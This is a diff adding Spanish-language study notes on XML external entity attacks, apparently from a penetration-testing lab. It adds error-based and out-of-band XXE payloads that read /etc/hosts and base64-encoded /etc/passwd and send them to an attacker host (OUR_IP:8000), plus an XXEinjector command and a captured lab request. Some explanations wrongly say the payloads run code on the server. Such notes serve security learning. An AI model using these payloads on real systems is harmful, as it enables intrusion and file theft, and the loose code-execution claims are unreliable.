@@ -122,3 +122,71 @@ done
 <email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
 ```
 - Desde la maquina atacante tenemos que xxe: `<!ENTITY joined "%begin;%file;%end;">`
+
+### Error based XXE
+- Error based XXE es un ataque que se basa en la identificación de errores en la aplicación web.
+- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar un payload con DTD para ejecutar código en el servidor.
+- Primero tenemos que ver de generar un error xml en la aplicación web.
+- Luego podemos tener un DTD así:
+```xml	
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+Y podemos tener el siguiente payload en la petición
+```xml
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+```
+## Out of Band XXE (blind XXE)
+- Es como una inyección ciega de SQLi, pero en este caso se utiliza un payload de tipo DTD para ejecutar código en el servidor.
+- Por ejemplo, si una aplicación web permite la inclusión de archivos XML externas, un atacante podría utilizar un payload de tipo DTD para ejecutar código en el servidor.
+- Pero no vamos a ver ningún output en la aplicación web.
+- Podemos tener el siguiente payload:
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+y la petición:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+
+## XXE automatizado
+- Podemos utilizar [XXEinjector](https://github.com/enjoiz/XXEinjector) para automatizar el proceso de inyección de XML externa.
+- `ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter` Nos tenemos que guardar la petición HTTP de burp
+```
+POST /blind/submitDetails.php HTTP/1.1
+
+Host: 10.129.197.101
+
+Content-Length: 140
+
+Accept-Language: en-US,en;q=0.9
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+
+Content-Type: text/plain;charset=UTF-8
+
+Accept: */*
+
+Origin: http://10.129.197.101
+
+Referer: http://10.129.197.101/
+
+Accept-Encoding: gzip, deflate, br
+
+Connection: keep-alive
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT```
